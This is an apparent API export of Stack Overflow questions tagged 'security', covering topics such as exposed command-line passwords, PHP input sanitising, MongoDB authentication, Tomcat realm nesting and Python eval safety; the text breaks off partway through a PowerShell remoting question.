{"count":17750,"tag":"security","questions":[{"tags":["c#","security","arguments","command-line-arguments","truecrypt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13279436,"title":"See command line arguments being passed to a program","body":"<p>You may skip this part</p>\n\n<blockquote>\n  <p>I am using a batch file that I have in my thumb drive in order to\n  mount a true crypt volume. I created that batch file with the help of\n  <a href=\"http://www.truecrypt.org/docs/?s=command-line-usage\" rel=\"nofollow\">this link</a>. on that batch file I have the username and password\n  that I pass as arguments to trueCrypt.exe in order for it to be\n  mounted.</p>\n</blockquote>\n\n<hr>\n\n<p>Anyways so my question is: will it be possible to see the arguments being passed to a program from a third party process? In other words, will it be possible to see the arguments being passed to this program:</p>\n\n<pre><code>using System;\nusing System.Reflection;\nusing System.Diagnostics;\n\nclass Program\n{\n    static string password = \"\";\n\n    static void Main(string[] args)\n    {\n        if (args.Length &gt; 0)\n            password = args[0];\n\n        // get location where this program resides \n        var locationOfThisExe = Assembly.GetExecutingAssembly().Location;\n\n\n        Console.Write(\"Press enter to start a new instance of this program.\");\n        Console.Read();\n\n        var randomArgument = new Random().NextDouble().ToString();\n        Process.Start(locationOfThisExe, randomArgument); \n        // I am passing a random argument to a new process!\n        // is it possible to see these arguments from another process?\n    }\n}\n</code></pre>\n\n<hr>\n\n<h2>Edit</h2>\n\n<p><strong>I am creating an edit cause I think I explained my self incorrectly but this edit should be a solution instead of a question</strong></p>\n\n<p>I think this question has not received enough attention. Executing the command showed by <a href=\"http://stackoverflow.com/users/235660/alois-kraus\">http://stackoverflow.com/users/235660/alois-kraus</a>  shows:</p>\n\n<p>(I pasted the output on notepad++)</p>\n\n<p><img src=\"http://i.stack.imgur.com/TAdH2.png\" alt=\"enter image description here\"></p>\n\n<p>on the image it does not show very clearly but I was able to see the argument being pass to that process. <strong>That matters a lot to me because I mount my true crypt volumes with the command:</strong></p>\n\n<p>\"C:\\Program Files\\TrueCrypt\\TrueCrypt.exe\" /v \"a:\\volume.tc\" /lz /a /p a</p>\n\n<p>that tells to truecrypt that I want to mount the volume located at <code>a:\\volume.tc</code> on drive letter z  and the password is <code>a</code></p>\n\n<p>If I execute that command true crypt will mount that volume on drive z:</p>\n\n<p><img src=\"http://i.stack.imgur.com/pDY9h.png\" alt=\"enter image description here\"></p>\n\n<p>the problem is that If I then execute the command <code>wmic process</code> note what shoes up:</p>\n\n<p><img src=\"http://i.stack.imgur.com/vkGM1.png\" alt=\"enter image description here\"></p>\n\n<p><strong>Note the password is in there!</strong></p>\n\n<p>So in summary it is not safe to pass secure information as an argument. It may be secure if you close the process that received the arguments but I think it is important to be aware of this...</p>\n"},{"tags":["java","security","root"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":736,"score":3,"question_id":5271731,"title":"Running a part of a Java Program as Root","body":"<p>All,</p>\n\n<p>I want to run a part of my Java program as root. Only one particular function as root. The other part of the programs should run with the user privileges with which the program was started. I want to run only the below code as root and the other as it is. This is because I see different behavior for this code when it runs with ROOT privileges.</p>\n\n<pre><code> try\n    {\n         addr = Inet6Address.getByName(host);\n         isReachable = addr.isReachable(20*1000);\n    } catch (UnknownHostException e)\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","mysql","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13279578,"title":"Confused on htmlspecialchars, real_escape_string, etc","body":"<p>I've written a decent admin interface that includes inventory management, content management, and blogging. Now its time to lock it down and make it secure (Yes, I should have been doing it from the beginning...</p>\n\n<p>For blog creation/editing, I'm using ckeditor which posts HTML output to editblog.php. Also i'm using simple text inputs for Title, Author, etc...</p>\n\n<p>I'm concerned because the blog will have img src=\"uploads/etc.jpg\", as well as divs, spans, etc...</p>\n\n<p>SO! When I sanitize this data, how do I make sure that all those quotes and slashes can be safely shoved into my SQL database, and what do i do to spit it back out on the frontend? I'm also concerned because if the blogger \"quotes\" something, I don't want that to be messed with either.</p>\n\n<p>Simple input like title, author, etc I'm using $title = mysqli_real_escape_string($title)\nBut is that enough? How do I preserve the user's intended input while avoiding attack?</p>\n\n<p>I've done my research and yet I still don't get it. I hope someone can break it down nice and simple for me...</p>\n"},{"tags":["security","https","passwords","fiddler","httpfox"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":14,"score":1,"question_id":13280249,"title":"Why httpfox can capture google account clear password in HTTPS?","body":"<p>I have installed <a href=\"https://addons.mozilla.org/en-US/firefox/addon/httpfox/?src=search\" rel=\"nofollow\">httpfox</a> on firefox. and I tried to capture traffic on Google Account login page, I typed a wrong password for my test, and, to my surprise, It captured clear password in https pages.</p>\n\n<p>But I tried <a href=\"http://www.fiddler2.com/fiddler2/\" rel=\"nofollow\">fiddler</a> on Firefox/IE, no clear data was captured.</p>\n\n<p>I heard that HTTPS headers are also encrypted. but why they still get captured in httpfox? Is it possible for a hacker to do the same thing over the network?</p>\n\n<p><img src=\"http://i.stack.imgur.com/EAlXS.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","security","environment"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":13279689,"title":"Is it unsafe to switch environments based on domain?","body":"<p>I am curious if doing something like setting your \"environment\" to Production, Dev, Staging, etc. based on a domain name such as dev.domain.com, staging.domain.com is a bad idea.</p>\n\n<p>Can somebody just edit their hosts file to point dev.domain.com to domain.com so now the system <em>thinks</em> it's in Dev when it really is in Prod? This would mean any Dev specific code will be ran by a complete stranger.</p>\n\n<p>Is this possible or is there a better way to determine your environment such as setting it manually in a server variable?</p>\n\n<p>For reference, I am using PHP.</p>\n"},{"tags":["security","encoding","character-encoding"],"answer_count":5,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":531,"score":0,"question_id":5202901,"title":"Who can decode this code?","body":"<p>Here are a few samples of strange code I see in our access logs. Can anyone decode this?</p>\n\n<p>For example:</p>\n\n<pre><code>\\xb3\\xe1\\xdd=H\\t\\xd5\\xd2\\xf0ml\\xf1\\x10\\xee/\\xa0$\\xeaY\\xa5\\xe7\\x81d \\xd5\\x1f\\xd9 QI\\xd9\\'\\xfb4I\\xb8\\xf3\\x1d0:\\xb5i\\x18Q\\x02\\xa5\\x10$\\xdd\\xcf\\xfa\\xc2\\xfa\\x15\\xd0\\xa8\\xa5\\xfc\\xb2\\xda\\xb9\\x9bA_\\x89\\xc4~\\x0e\\x0ebg*&gt;\\x18\\x12\\x9aniA\\xf6\\xfc\\x85%]\\x1d\\xa6\\x16\\xfe\\x96\\x13\\xe1\\xd8\\xb2\\xf3i~\\xde\\xec6\\xdbgW\\xc3c\\xac2\\x7f\\x9f&amp;\\xa5\\xce\\x14B8~8\\xbe\\xff1\\xa8\\xe6\\x9a\\x9d\\xf7 \\x14\\x10\\x9d\\xce\\xda\\x06\\x93r\\xe7\\x86\\x98\\xa1\\x85^\\xfa\\x93\\xf1\\x94G\\x95\\xc0\\x1b\\xc9\\x81\\xcb&lt;\\x04/\\x836E\\x85\\xbd\\xae%\\x07D\\xe9j\\x80\\x7f=\\xccWW\\x04.\\xbe\\x0f\\xb6\\x8c\n</code></pre>\n\n<p>Now, if we leave out all the unreadable characters we get:</p>\n\n<pre><code>=H\\tml/$Yd  QI'4I0:iQ$A_~bg*&gt;niA%]i~6gWc2&amp;B8~81 r^G&lt;/6E%Dj=WW.\n</code></pre>\n\n<p>The \"H\\tml\" part in the beginning could suggest that the code above contains some HTML code, or it may just be a coincidence?</p>\n\n<p>Here are a few more samples:</p>\n\n<pre><code>\\xbdl\\x1cq\\x1e\\xf65\\xe3@3\\xd8E\\xa8\\xf7\\xc0e\\x10\\xfe\\x15\\xbfzhap\\xff\\xe6i\\x9cq\\xe3bGm\\x81DWQ\\xf5\\x94\\xbav~\\\\\\xaa\\xd0\\xed\\xdfl\\x028\\x1d\\xcds\\x07H\\x02\\x04\\xf2\\x8fU\\xe0\\xd6x,\\x9f\\x98)\\xe8\\x1c \\xc7\\xdd\\xd7\\xea\\xd0\\x12h^\\xb4\\xd0\\x85G\\xdb\\xe4 \\xe6\\xabYM\\xf36\\\"&lt;\\xb6\\x1e\\xeak]\\x93\\xc2D\\xfa\\xc4\\xe9\\xa93,b\\xf5\\x80\\x15\\x92L5\\x02\\xc3GY\\xa7k\\x7f\\xa2\\xfd}\\xa2%+\\x14\\xf5\\xe8\\x95\\x1f\\xe2\\xef\\xd41\n\nst|]%Y\\xbf\\xeaj\\xe9&lt;z\\xbb\\xfb\\xe76\\xbbf&gt;\\xe9\\x1dU{\\xaf\\x97\\x1b\\x9e\\xf3&amp;\\x9b\\x87t{\\xf3O0\\x8c`TQ\\xdc\\xbd.\\xee\\xff\\x9cEG\\xabU\\xc5 \\xfc[\\xe0\\x0f\\xa5jK\\x85\\x92\\xb2\\x90\\x96E\\xba\\x9c\\x9c\\xa5\\xccA`\\v\\xa0\\xd7&gt;3\\t\\x89u\\x11\\x817\\xa5\\xb2\\x83\\xfa\\x89A\\x14\\x07\\xe1\\xc4&gt;\\\"\\xb4\\x02m\\xe4\\x9eZ\\x9b&gt;\\xb0\\xe5\\x9c\\x15\\xa0p\\xado:\\xb4\\x1d\\x1a\\xb7\\xb1\\x1c\\x0f\\xa3\\xadz-\\xdc\\xb5q\\xb9\\xfc\\xb95g\\xb8\\xa8 \\xd2t\\xa3\\x90\\xe7N\\xa7e \\x15I\\xe6\\x1b\\xdbNB5\\xfa3\\xed\\xfdG\\t\\x19(\\xe1\\x9f\n\nwo\\x01\\xb9\\x98\\xa6q.\\x0c&amp;\\xba\\x1dnXN\\xce\\xb7\\xd3\\x99\\xfd\\x12&gt;*\\xa5\\x89\\xc9\\xb2 lQ\\x89\\xcc\\x9f\\x113+\\xb5\\xc4\\x86\\xb6g\\x97\\x15]\\x98g\\xc1\\xa1\\xa8\\xfeK\\x03\\xb5w\\xe4\\xf8&amp;\\xc8`1\\x8c\\x1c\\x88\\x82\\xc2]\\x8d&amp;\\xbc\\x8cU&amp;4\\xc5[jS \\xb0\\xed\\xf7m{\\x95i\n\n\\xbdl\\x1cq\\x1e\\xf65\\xe3@3\\xd8E\\xa8\\xf7\\xc0e\\x10\\xfe\\x15\\xbfzhap\\xff\\xe6i\\x9cq\\xe3bGm\\x81DWQ\\xf5\\x94\\xbav~\\\\\\xaa\\xd0\\xed\\xdfl\\x028\\x1d\\xcds\\x07H\\x02\\x04\\xf2\\x8fU\\xe0\\xd6x,\\x9f\\x98)\\xe8\\x1c \\xc7\\xdd\\xd7\\xea\\xd0\\x12h^\\xb4\\xd0\\x85G\\xdb\\xe4 \\xe6\\xabYM\\xf36\\\"&lt;\\xb6\\x1e\\xeak]\\x93\\xc2D\\xfa\\xc4\\xe9\\xa93,b\\xf5\\x80\\x15\\x92L5\\x02\\xc3GY\\xa7k\\x7f\\xa2\\xfd}\\xa2%+\\x14\\xf5\\xe8\\x95\\x1f\\xe2\\xef\\xd41\n</code></pre>\n\n<p>We see such codes often in the logs. Like millions times a day. Makes me very curious about its contents :))</p>\n\n<p>(more) code also available via <a href=\"http://pastebin.com/ZcXM5NHs\" rel=\"nofollow\">http://pastebin.com/ZcXM5NHs</a></p>\n"},{"tags":["sql-server-2005","security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":4900,"score":0,"question_id":733744,"title":"SQL server Error 4060","body":"<p>4060 \"Server rejected the connection; Access to selected database has been denied\".</p>\n\n<p>How can I troubleshoot this error?</p>\n"},{"tags":["spring","security","grails-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13276860,"title":"Sorry, we were not able to find a user with that username and password","body":"<p>I installed the Spring Security core plug-in 1.2.7.3 on Grails 2.1.1, ran the s2-quickstart command, and then initialized the initial user and roles in the bootstrap.groovy, but I still cannot login.  Text of the relevant piece of bootstrap.groovy follows:</p>\n\n<pre><code>    if (SecRole.count == 0) {\n        def fUserRole = SecRole.findByAuthority('ROLE_FlowUser') ?: new SecRole(authority: 'ROLE_FlowUser').save(failOnError: true, flush: true)\n        def fAdminRole = SecRole.findByAuthority('ROLE_FlowAdmin') ?: new SecRole(authority: 'ROLE_FlowAdmin').save(failOnError: true, flush: true)\n\n        def bf = SecUser.findByUsername('bill') ?: new SecUser(\n                username: 'bill',\n                password: 'eagle',\n                firstName: 'bill',\n                lastName: 'fly',\n                email: 'bill.fly@baylorhealth.edu',\n                accountExpired: false,\n                accountLocked: false,\n                passwordExpired: false,\n                enabled: true\n        ).save(failOnError: true, flush: true)\n\n        if (!bf.authorities.contains(fAdminRole)) {\n            SecUserSecRole.create bf, fAdminRole, true\n        }\n        if (!bf.authorities.contains(fUserRole)) {\n            SecUserSecRole.create bf, fUserRole, true\n        }\n    }\n</code></pre>\n\n<p>I am not encrypting the password in bootstrap, as seems to be the answer to most of the questions of this type.  All four records are getting written to the database tables, but of course, I cannot tell if the password is encrypted correctly.  My initial controller has the following annotation ahead of the class statement:\n@Secured(['IS_AUTHENTICATED_FULLY'])</p>\n\n<p>Also, I added the following to the config.groovy:</p>\n\n<p>// Added by the Spring Security Core plugin:\ngrails.plugins.springsecurity.userLookup.userDomainClassName = 'cocktail.SecUser'\ngrails.plugins.springsecurity.userLookup.authorityJoinClassName = 'cocktail.SecUserSecRole'\ngrails.plugins.springsecurity.authority.className = 'cocktail.SecRole'\ngrails.plugins.springsecurity.password.algorithm = 'SHA-256'</p>\n"},{"tags":["mysql","security","encryption","aes","ecb"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13276725,"title":"Using AES_ENCRYPT in another mode","body":"<p>Is it possible to use MySQL's AES_ENCRYPT and AES_DECRYPT functions in a mode other than ECB (like CBC)? Various questions on Stack Overflow talk about how MySQL uses ECB mode and to not use these functions. Am I better off doing the encryption/decryption in the programming language I'm working with?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13276225,"title":"Can I restrict website access to specific computers?","body":"<p>I realize that mac addresses or machine ids aren't transferred over the internet, however, I would like to lock down our subscription-based website security so that only specific computers can register and have access to its resources.</p>\n\n<p>Large organizations will subscribe to our service and will undoubtedly have more than one ip for their organization.  As well, we'd like to give the ability for their qualified employees to access the website on devices outside of their physical organization (for road-trip presentations, etc.). </p>\n\n<p>Is there a sure-fire way to achieve this end (beyond the username/password assigned to each account)?  If not, what would be the most effective approach?</p>\n"},{"tags":["javascript","regex","security","injection"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":13276474,"title":"can a regex whitespace character cause an injection?","body":"<p>if I want to validate the input of a <code>&lt;textarea&gt;</code>, and want it to contain, for example, only numerical values, but even want to give users the possibility to insert new lines, I can selected wanted characters with a javascript regex that includes even the whitespace characters. </p>\n\n<pre><code>/[0-9\\s]/\n</code></pre>\n\n<p>The question is: do a whitecharacter can be used to perform injections, XSS,even if I think this last option is impossible, or any other type of attack ? </p>\n\n<p>thanks</p>\n"},{"tags":["java","javascript","database","security","mongodb"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":2,"view_count":45,"score":1,"question_id":13276329,"title":"MongoDB Security issue","body":"<p>My confidence in MongoDB security is shaken, and I'm hopping it will be restored with an explanation that I'm doing something wrong...</p>\n\n<p>I've created MongoDB's Windows Service like this:</p>\n\n<blockquote>\n  <p>mongod --logpath \"C:\\mongoDB\\logs\" --logappend --dbpath\n  \"C:\\mongoDB\\data\\db\" --serviceName MongoDB --serviceDisplayName \"Mongo\n  DB\" --port 27017 <strong>--auth</strong> --install</p>\n</blockquote>\n\n<p>I've then created a DB and added the administration user to that DB's system.users collection.</p>\n\n<p>Then I filled that DB with some random information to a test collection I've created.</p>\n\n<p>Up until now, everything is great and I am able to access the DB only if I have the administrator credentials...</p>\n\n<p>Now the important part...</p>\n\n<p>I removed the service like this:</p>\n\n<blockquote>\n  <p>mongod --remove --serviceName \"MongoDB\"</p>\n</blockquote>\n\n<p>Then I recreated the service but with no authentication like this:</p>\n\n<blockquote>\n  <p>mongod --logpath \"C:\\mongoDB\\logs\" --logappend --dbpath\n  \"C:\\mongoDB\\data\\db\" --serviceName MongoDB --serviceDisplayName \"Mongo\n  DB\" --port 27017 <strong>--noauth</strong> --install</p>\n</blockquote>\n\n<p>What amazes me is that I am now able to access the DB I've created with now authentication...</p>\n\n<p>Please tell me I should have done something differently.</p>\n"},{"tags":["web-services","security","rest","soap"],"answer_count":12,"favorite_count":29,"up_vote_count":50,"down_vote_count":0,"view_count":33096,"score":50,"question_id":853620,"title":"Secure Web Services: REST over HTTPS vs SOAP + WS-Security. Which is better?","body":"<p>I'm not a security expert by any means, but I favor creating REST-style web services.  </p>\n\n<p>In creating a new service which needs to have the data it transmits secure.  We've entered a debate over which approach is more secure - REST with HTTPS or a SOAP WS with WS-Security.</p>\n\n<p>I am under the impression we could use HTTPS for all the web service calls and this approach would be secure.  The way I look at it is, \"if HTTPS is good enough for bank and financial web sites, it's good enough for me\".  Again, I'm not expert in this space, but I'd think that these people have thought considerably hard about this problem and are comfortable with HTTPS.</p>\n\n<p>A coworker disagrees and says SOAP and WS-Security is the only way to go.</p>\n\n<p>The web seems all over the board on this.</p>\n\n<p>Maybe the community here could weigh in on the pros and cons of each?  Thanks!</p>\n"},{"tags":["java","security","tomcat","realm"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":14,"score":2,"question_id":13274696,"title":"Tomcat 7 nesting CombinedRealm, LockoutRealm and DataSourceRealm","body":"<p>I'm trying to nest Realms as follows in Tomcat (written here in pseudo-XML):</p>\n\n<pre><code>&lt;CombinedRealm&gt;\n  &lt;LockoutRealm&gt;\n     &lt;DataSourceRealm/&gt;\n  &lt;/LockoutRealm&gt;\n  &lt;UserDatabaseRealm/&gt;\n&lt;/CombinedRealm&gt;\n</code></pre>\n\n<p>This doesn't seem to work - is it possible to next Realms in Tomcat by more than two levels? I get a warning in the logs: </p>\n\n<pre><code>No rules found matching 'Server/Service/Engine/Realm/Realm/Realm'.\n</code></pre>\n\n<p>The idea behind is that the web service has some critical users that must not be locked out (e.g. as a DOS) and some normal users, which may have weaker passwords, where the lockoutRealm should be active. I'm sure other people have been in this situation.</p>\n\n<p>If there is another way to achieve this (e.g. a whitelist for the LockoutRealm), please let me know.</p>\n\n<p>Single sign on is also needed.</p>\n\n<p>Thanks for any help!</p>\n\n<p>Here is the relevant part of server.xml of my test config:</p>\n\n<pre><code>&lt;Engine name=\"Catalina\" defaultHost=\"localhost\"&gt;\n\n  &lt;Realm className=\"org.apache.catalina.realm.CombinedRealm\"&gt;\n\n    &lt;!-- Lockout realm for the DB users --&gt;\n    &lt;Realm className=\"org.apache.catalina.realm.LockOutRealm\"&gt;\n      &lt;!-- PRIMARY: DataSourceRealm with user DB --&gt;\n      &lt;Realm className=\"org.apache.catalina.realm.DataSourceRealm\"\n         dataSourceName=\"jdbc/authority\"\n         userTable=\"user\" userNameCol=\"username\" \n         userCredCol=\"password\" digest=\"SHA\"\n         userRoleTable=\"user_role\" roleNameCol=\"rolename\" /&gt;\n    &lt;/Realm&gt;\n\n    &lt;!-- FALLBACK:\n         This Realm uses the UserDatabase configured in the global JNDI\n         resources under the key \"UserDatabase\".  Any edits\n         that are performed against this UserDatabase are immediately\n         available for use by the Realm.  --&gt;\n    &lt;Realm className=\"org.apache.catalina.realm.UserDatabaseRealm\"\n           resourceName=\"UserDatabase\"/&gt;\n\n  &lt;/Realm&gt;\n\n  &lt;Host name=\"localhost\"  appBase=\"webapps\"\n        unpackWARs=\"true\" autoDeploy=\"true\"&gt;\n\n    &lt;!-- SingleSignOn valve, share authentication between web applications\n         Documentation at: /docs/config/valve.html --&gt;\n    &lt;Valve className=\"org.apache.catalina.authenticator.SingleSignOn\" /&gt;\n\n    &lt;!-- Access log processes all example.\n         Documentation at: /docs/config/valve.html\n         Note: The pattern used is equivalent to using pattern=\"common\" --&gt;\n    &lt;Valve className=\"org.apache.catalina.valves.AccessLogValve\" directory=\"logs\"\n           prefix=\"localhost_access_log.\" suffix=\".txt\"\n           pattern=\"%h %l %u %t &amp;quot;%r&amp;quot; %s %b\" /&gt;\n\n  &lt;/Host&gt;\n&lt;/Engine&gt;\n</code></pre>\n"},{"tags":["php","forms","security","post"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13274305,"title":"Bare minimum to secure a PHP form","body":"<p>There are a lot of 'secure PHP form' questions out there, but I wasn't able to find a simple definitive 'bare-minimum needed' answer.</p>\n\n<p>How would I go about making a form 100% safe? Is it as simple as running a function on the output like so:</p>\n\n<pre><code>$text = $_POST['text'];\n$text = doThisToMakeSafe($text);\n</code></pre>\n\n<p>or are there other ways someone can get malicious access via a form without submitting?</p>\n\n<p>Ideally, I'd like a snippet of code I can throw into all forms so that I never have to worry about any security issues. Is this possible?</p>\n"},{"tags":["php","database","security","query","hash"],"answer_count":7,"favorite_count":2,"up_vote_count":14,"down_vote_count":0,"view_count":3426,"score":14,"question_id":3665247,"title":"Fastest hash for non-cryptographic uses?","body":"<p>I'm essentially preparing phrases to be put into the database, they may be malformed so I want to store a short hash of them instead (I will be simply comparing if they exist or not, so hash is ideal).</p>\n\n<p>I assume MD5 is fairly slow on 100,000+ requests so I wanted to know what would be the best method to hash the phrases, maybe rolling out my own hash function or using <code>hash('md4', '...'</code> would be faster in the end?</p>\n\n<p>I know MySQL has MD5(), so that would complement a bit of speed on the query end, but maybe there's further a faster hashing function in MySQL I don't know about that would work with PHP..</p>\n"},{"tags":["security","x509","certificates","expiry"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":14,"score":1,"question_id":13272843,"title":"Why is it OK for CA certificates to have long expiry times but not the certs they sign?","body":"<p>I was looking at the certificate behind <a href=\"https://www.google.co.uk/\" rel=\"nofollow\">https://www.google.co.uk/</a> earlier and noticed that, as is typical, the certificate was set to expire after a year, by 2013.</p>\n\n<p>I looked up the chain and notices that the root cert, a GeoTrust cert, has a 20 year lifetime and doesn't expire until 2018.</p>\n\n<p>It seems odd as the integrity of signing certificates seem to me more important than the certificates they sign. Why is it OK for root authorities to live for a long time but the certificates they sign tend to have much shorted expiry times?</p>\n"},{"tags":["security","signature","malware-detection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13152150,"title":"Signature scanning","body":"<p>many antivirus programs using signature-based malware detection. Here is <a href=\"http://www.clamav.net/doc/webinars/Webinar-Alain-2009-03-04.pdf\" rel=\"nofollow\">creating signatures for ClamAV</a>. I can understand how they create signatures considering that the whole file is a malware, but I couldn't understand how to find malware when it is in the body of the file - the hash would be another. Anybody knows?</p>\n"},{"tags":["java","security","java-ee","websphere"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13271231,"title":"Filter executed before j_security_check","body":"<p>I have a filter mapped to /* and my security constraint is mapped to /*.</p>\n\n<p>The filter perfoms a request forward when the application is not configured (an entry in the database). </p>\n\n<p>When I access the application I am expecting to see the login page that is served up by the j_securit_check but instead the filter is executed and the forward is performed. This ends in a loop as I never get to the login page.</p>\n\n<p>I thought security checks were performed <em>before</em> filters were processed?</p>\n\n<p>This is WebSphere 8.0.0.4. It functions fine under Tomcat and JBoss. </p>\n\n<p>Thanks for reading.</p>\n"},{"tags":["wcf","security","authorization"],"answer_count":6,"favorite_count":3,"up_vote_count":24,"down_vote_count":0,"view_count":39427,"score":24,"question_id":1026855,"title":"WCF - Windows authentication - Security settings require Anonymous","body":"<p>I am struggling hard with getting WCF service running on IIS on our server. After deployment I end up with an error message:</p>\n\n<p><em>Security settings for this service require 'Anonymous' Authentication but it is not enabled for the IIS application that hosts this service.</em> </p>\n\n<p>I want to use Windows authentication and thus I have Anonymous access disabled. Also note that there is aspNetCompatibilityEnabled (if that makes any difference).</p>\n\n<p>Here's my web.config:</p>\n\n<pre><code>&lt;system.serviceModel&gt;\n\t&lt;serviceHostingEnvironment aspNetCompatibilityEnabled=\"true\" /&gt;\n\t&lt;bindings&gt;\n\t\t&lt;webHttpBinding&gt;\n\t\t\t&lt;binding name=\"default\"&gt;\n\t\t\t\t&lt;security mode=\"TransportCredentialOnly\"&gt;\n\t\t\t\t\t&lt;transport clientCredentialType=\"Windows\" proxyCredentialType=\"Windows\"/&gt;\n\t\t\t\t&lt;/security&gt;\n\t\t\t&lt;/binding&gt;\n\t\t&lt;/webHttpBinding&gt;\n\t&lt;/bindings&gt;\n\t&lt;behaviors&gt;\n\t\t&lt;endpointBehaviors&gt;\n\t\t\t&lt;behavior name=\"AspNetAjaxBehavior\"&gt;\n\t\t\t\t&lt;enableWebScript /&gt;\n\t\t\t\t&lt;webHttp /&gt;\n\t\t\t&lt;/behavior&gt;\n\t\t&lt;/endpointBehaviors&gt;\n\t\t&lt;serviceBehaviors&gt;\n\t\t\t&lt;behavior name=\"defaultServiceBehavior\"&gt;\n\t\t\t\t&lt;serviceMetadata httpGetEnabled=\"true\" httpsGetEnabled=\"false\" /&gt;\n\t\t\t\t&lt;serviceDebug includeExceptionDetailInFaults=\"true\" /&gt;\n\t\t\t\t&lt;serviceAuthorization principalPermissionMode=\"UseWindowsGroups\" /&gt;\n\t\t\t&lt;/behavior&gt;\n\t\t&lt;/serviceBehaviors&gt;\n\t&lt;/behaviors&gt;\n\t&lt;services&gt;\n\t\t&lt;service name=\"xxx.Web.Services.RequestService\" behaviorConfiguration=\"defaultServiceBehavior\"&gt;\n\t\t\t&lt;endpoint behaviorConfiguration=\"AspNetAjaxBehavior\" binding=\"webHttpBinding\"\n\t\t\t contract=\"xxx.Web.Services.IRequestService\" bindingConfiguration=\"default\"&gt;\n\t\t\t&lt;/endpoint&gt;\n\t\t\t&lt;endpoint address=\"mex\" binding=\"mexHttpBinding\" name=\"mex\" contract=\"IMetadataExchange\"&gt;&lt;/endpoint&gt;\n\t\t&lt;/service&gt;\n\t&lt;/services&gt;\n&lt;/system.serviceModel&gt;\n</code></pre>\n\n<p>I have searched all over the internet with no luck. Any clues are greatly appreciated.</p>\n"},{"tags":["java","security","applet","digital-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13271372,"title":"Digital Certificate not loaded in browser on windows System","body":"<p>When I run applet and initialize browser key store I get this error:</p>\n\n<pre><code>java.security.AccessControlException: access denied (\"java.security.SecurityPermission\" \"authProvider.SunMSCAPI\")\n</code></pre>\n\n<p>To resolve this error I have added first two lines:</p>\n\n<pre><code>Provider mscapi = Security.getProvider(\"SunMSCAPI\");\nSecurity.addProvider(mscapi);\n\nkeyStore = KeyStore.getInstance(\"Windows-MY\");\nkeyStore.load(null, null);\n\nreturn keyStore;\n</code></pre>\n\n<p>But still it is not working it will give error access denied for inserting <code>SunMSCAPI</code> provider.</p>\n"},{"tags":["python","security","eval"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":13066594,"title":"Is there a way to secure strings for Python's eval?","body":"<p>There are many questions on SO about using Python's eval on <strong>insecure strings</strong> (eg.: <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Security of Python's eval() on untrusted strings?</a>, <a href=\"http://stackoverflow.com/questions/3513292/python-make-eval-safe\">Python: make eval safe</a> and <a href=\"http://stackoverflow.com/questions/661084/security-of-pythons-eval-on-untrusted-strings\">Security of Python's eval() on untrusted strings?</a>). The unanimous answer is that this is a bad idea.</p>\n\n<p>However, I found little information on which strings can be considered safe (if any).\nNow I'm wondering if there is a definition of \"safe strings\" available (eg.: a string that only contains lower case ascii chars or any of the signs +-*/()). The exploits I found generally relied on either of _.,:[]'\" or the like. Can such an approach be secure (for use in a graph painting web application)?</p>\n\n<p>Otherwise, I guess using a parsing package as Alex Martelli suggested is the only way.</p>\n\n<p>EDIT:\nUnfortunately, there are neither answers that give a compelling explanation for why/ how the above strings are to be considered insecure (a tiny working exploit) nor explanations for the contrary. I am aware that using eval should be avoided, but that's not the question. Hence, I'll award a bounty to the first who comes up with either a working exploit or a really good explanation why a string mangled as described above is to be considered (in)secure.</p>\n"},{"tags":["security","powershell","powershell-v2.0","powershell-remoting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13271394,"title":"Error Unknown security using Remote PSSession CredSSP","body":"<p>I have Windows 7 64 bits, and Powershell 2.0, and CredSSP enabled in client</p>\n\n<pre><code>Enable-WSManCredSSP -Role Client -DelegateComputer * -Force\n</code></pre>\n\n<p>I open Powershell Console, and I execute Enter-PSSession command to connect Windows 2008 Server using CredSSP authentication:</p>\n\n<pre><code>Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\\installerUser\n</code></pre>\n\n<p>I want execute Get-WSManCredSSP command remotely, but I get error: \"... while using Negotiate authentication: An unknown security error occurred.\"</p>\n\n<pre><code>PS C:\\Users\\myUser&gt; Enter-PSSession -Computername ServerMOSS -Authentication Credssp -Credential MyDomain\\installerUser\n\n[ServerMOSS]: PS C:\\Users\\installerUser\\Documents&gt; Get-WSManCredSSP\n\nWinRM cannot process the request. The following error occured while using Negotiate authentication: An unknown security\n error occurred.\n Possible causes are:\n  -The user name or password specified are invalid.\n  -Kerberos is used when no authentication method and no user name are specified.\n  -Kerberos accepts domain user names, but not local user names.\n  -The Service Principal Name (SPN) for the remote computer name and port does not exist.\n  